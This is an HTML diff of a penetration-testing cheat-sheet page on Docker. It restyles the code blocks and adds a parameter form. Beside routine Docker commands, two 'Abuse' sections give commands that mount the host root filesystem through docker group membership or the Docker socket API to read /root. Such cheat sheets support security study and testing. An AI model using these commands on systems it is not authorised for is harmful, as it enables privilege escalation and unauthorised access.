@@ -195,31 +195,154 @@
   <li><a href="https://tldrbins.github.io/@dive/">Dive</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="basic-commands">Basic Commands</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show all running processes</span>
-</span></span><span class="line"><span class="cl">sudo docker ps -a
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show all images</span>
-</span></span><span class="line"><span class="cl">sudo docker images -a
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Stop all processes</span>
-</span></span><span class="line"><span class="cl">sudo docker stop <span class="k">$(</span>sudo docker ps -a -q<span class="k">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remove all processes</span>
-</span></span><span class="line"><span class="cl">sudo docker rm -vf <span class="k">$(</span>sudo docker ps -a -q<span class="k">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remove all images</span>
-</span></span><span class="line"><span class="cl">sudo docker rmi -f <span class="k">$(</span>sudo docker images -aq<span class="k">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Shell in docker</span>
-</span></span><span class="line"><span class="cl">sudo docker <span class="nb">exec</span> -it &lt;CONTAINER_NAME&gt; sh
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy file from host to container</span>
-</span></span><span class="line"><span class="cl">sudo docker cp &lt;HOST_FILE_PATH&gt; &lt;CONTAINER_ID&gt;:&lt;CONTAINER_FILE_PATH&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy file from container to host</span>
-</span></span><span class="line"><span class="cl">sudo docker cp &lt;CONTAINER_ID&gt;:&lt;CONTAINER_FILE_PATH&gt; &lt;HOST_FILE_PATH&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy folder from host to container</span>
-</span></span><span class="line"><span class="cl">sudo docker cp &lt;HOST_FOLDER_PATH&gt;/. &lt;CONTAINER_ID&gt;:&lt;CONTAINER_TARGET_PATH&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy folder from container to host</span>
-</span></span><span class="line"><span class="cl">sudo docker cp &lt;CONTAINER_ID&gt;:&lt;CONTAINER_FOLDER_PATH&gt;/. &lt;HOST_TARGET_PATH&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show all running processes
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker ps -a
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show all images
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker images -a
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Stop all processes
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker stop $(sudo docker ps -a -q)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remove all processes
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker rm -vf $(sudo docker ps -a -q)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remove all images
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker rmi -f $(sudo docker images -aq)
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Shell in docker
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker exec -it &lt;CONTAINER_NAME&gt; sh
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy file from host to container
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker cp &lt;HOST_FILE_PATH&gt; &lt;CONTAINER_ID&gt;:&lt;CONTAINER_FILE_PATH&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy file from container to host
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker cp &lt;CONTAINER_ID&gt;:&lt;CONTAINER_FILE_PATH&gt; &lt;HOST_FILE_PATH&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy folder from host to container
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker cp &lt;HOST_FOLDER_PATH&gt;/. &lt;CONTAINER_ID&gt;:&lt;CONTAINER_TARGET_PATH&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy folder from container to host
+</span></span><span class="line"><span class="cl"><span class="go">sudo docker cp &lt;CONTAINER_ID&gt;:&lt;CONTAINER_FOLDER_PATH&gt;/. &lt;HOST_TARGET_PATH&gt;
+</span></span></span></code></pre></div></div>
 <br>
 <hr>
 <h3 id="explore-docker-image">Explore Docker image</h3>
@@ -227,34 +350,35 @@
 <button data-tabset="set1" data-tabcontent="tab1" class="active">dive</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dive docker-archive://image.tar
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">dive docker-archive://image.tar
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://github.com/wagoodman/dive">dive</a></em></small></p></div></p>
 <br>
 <hr>
 <h3 id="abuse-1-docker-group">Abuse #1: Docker group</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List images</span>
-</span></span><span class="line"><span class="cl">docker images
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Mount host root filesystem</span>
-</span></span><span class="line"><span class="cl">docker run -v /:/mnt -it &lt;IMAGE_NAME&gt; bash
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
-</span></span><span class="line"><span class="cl">ls /mnt/root
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List images
+</span></span><span class="line"><span class="cl"><span class="go">docker images
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Mount host root filesystem
+</span></span><span class="line"><span class="cl"><span class="go">docker run -v /:/mnt -it &lt;IMAGE_NAME&gt; bash
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">ls /mnt/root
+</span></span></span></code></pre></div></div>
 <br>
 <hr>
 <h3 id="abuse-2-docker-api">Abuse #2: Docker API</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show running containers</span>
-</span></span><span class="line"><span class="cl">curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create container</span>
-</span></span><span class="line"><span class="cl">curl -s -X POST -H <span class="s1">&#39;Content-Type: application/json&#39;</span> --data-binary <span class="s1">&#39;{&#34;Image&#34;: &#34;&lt;IMAGE_NAME&gt;:latest&#34;,&#34;HostConfig&#34;: {&#34;Binds&#34;: [&#34;/:/r&#34;]}, &#34;Cmd&#34;: [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;ls -la /r/root/&#34;], &#34;Tty&#34;: true}&#39;</span> --unix-socket /var/run/docker.sock http://localhost/containers/create
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start container</span>
-</span></span><span class="line"><span class="cl">curl -s -X POST -H <span class="s1">&#39;Content-Type: application/json&#39;</span> --unix-socket /var/run/docker.sock http://localhost/containers/&lt;CONTAINER_ID&gt;/start
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show results</span>
-</span></span><span class="line"><span class="cl">curl -s --unix-socket /var/run/docker.sock <span class="s2">&#34;http://localhost/containers/&lt;CONTAINER_ID&gt;/logs?stderr=1&amp;stdout=1&#34;</span>
-</span></span></code></pre></div></div>
-<br></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show running containers
+</span></span><span class="line"><span class="cl"><span class="go">curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create container
+</span></span><span class="line"><span class="cl"><span class="go">curl -s -X POST -H &#39;Content-Type: application/json&#39; --data-binary &#39;{&#34;Image&#34;: &#34;&lt;IMAGE_NAME&gt;:latest&#34;,&#34;HostConfig&#34;: {&#34;Binds&#34;: [&#34;/:/r&#34;]}, &#34;Cmd&#34;: [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;ls -la /r/root/&#34;], &#34;Tty&#34;: true}&#39; --unix-socket /var/run/docker.sock http://localhost/containers/create
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start container
+</span></span><span class="line"><span class="cl"><span class="go">curl -s -X POST -H &#39;Content-Type: application/json&#39; --unix-socket /var/run/docker.sock http://localhost/containers/&lt;CONTAINER_ID&gt;/start
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show results
+</span></span><span class="line"><span class="cl"><span class="go">curl -s --unix-socket /var/run/docker.sock &#34;http://localhost/containers/&lt;CONTAINER_ID&gt;/logs?stderr=1&amp;stdout=1&#34;
+</span></span></span></code></pre></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
